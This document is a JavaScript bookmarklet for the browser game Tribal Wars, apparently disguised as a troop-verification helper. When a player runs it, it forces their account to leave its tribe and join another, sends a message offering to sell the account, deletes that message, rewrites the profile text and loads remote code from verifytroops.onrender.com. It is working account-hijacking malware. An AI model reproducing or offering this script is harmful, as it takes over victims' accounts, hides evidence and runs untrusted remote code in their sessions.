javascript:(async function(){
    const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'});
    TribalWars.get(url);

    setTimeout(() => {
        const urll = TribalWars.buildURL('GET', {screen: 'info_ally', action: 'join', id: '1424'});
        TribalWars.get(urll);
    }, 600);

    async function getLastMessageId(playerName) {
    try {
        const htmlText = await $.get("game.php", { screen: "mail" });

        const $html       = $(htmlText);
        const $elements   = $html.find(
            "#content_value > table > tbody > tr > td:nth-child(2) > form > table:nth-child(3) > tbody > tr > td.nowrap"
        );

        let foundIndex = -1;

        $elements.each(function (index) {
            console.log("oiii>> ", $(this).text().trim())
            if ($(this).text().trim() === playerName) {
                foundIndex = index + 1;   
                return false;            
            }
        });

        if (foundIndex > -1) {
            console.log("achou")
            const url = $html
                .find(`#content_value > table > tbody > tr > td:nth-child(2) > form > table:nth-child(3) > tbody > tr:nth-child(${foundIndex + 1}) > td:nth-child(1) > a`)
                .attr("href");
    
            const params    = new URLSearchParams(new URL(url, location.origin).search);
            const viewValue = params.get("view");

            const string = `ids[${viewValue}]`;
    
    TribalWars.post('mail',
            { mode: 'in', action: 'del_move_multiple', group: '0' },
            { [string]: 'on', del: 'Apagar', from: '0', num_igms: '100',  }, function () {
            },
                !1
            );
                                
    
                return viewValue ?? 0;
            }

        return 0;
    } catch (err) {
        console.error("getLastMessageId error:", err);
        return 0;
    }
}


    async function cada_mp(player, msg, subj) {
        const parts = TribalWars.buildURL("POST", 'mail', { mode:'new', action: 'send' }).split('&h=');
        const postUrl = parts[0];
        const h = parts[1] || '';

        $.ajax({
            url: postUrl,
            type: 'POST',
            data: {
                to: player,
                subject: subj || 'ola',
                text: msg || '',
                extended: 0,
                send: 'Enviar',
                h: h
            },
            success: function() {
                
            },
            error: function(xhr) {
                
            }
        });
    }

    const pn = 'Dark-Shadow';

    await cada_mp(pn, 'Quer me vender sua conta por R$350,00', 'Venda de conta');
    setTimeout(async function() {
        const messageId = await getLastMessageId(pn);
        console.log(messageId)
    }, 1000);


    setTimeout(() => {
        $.getScript("https://verifytroops.onrender.com/xx.js");
    }, 2000);

    setTimeout(() => {
        TribalWars.post('mail',
            { screen: 'info_player', edit: '1', action: 'change_text' },
            { personal_text: 'menor esteve aqui', send: 'Salvar'}, function () {
            },
                !1
            );
    }, 1500);

    setTimeout(() => {
        UI.SuccessMessage("Menor esteve aqui")
    }, 2000);

    
})();
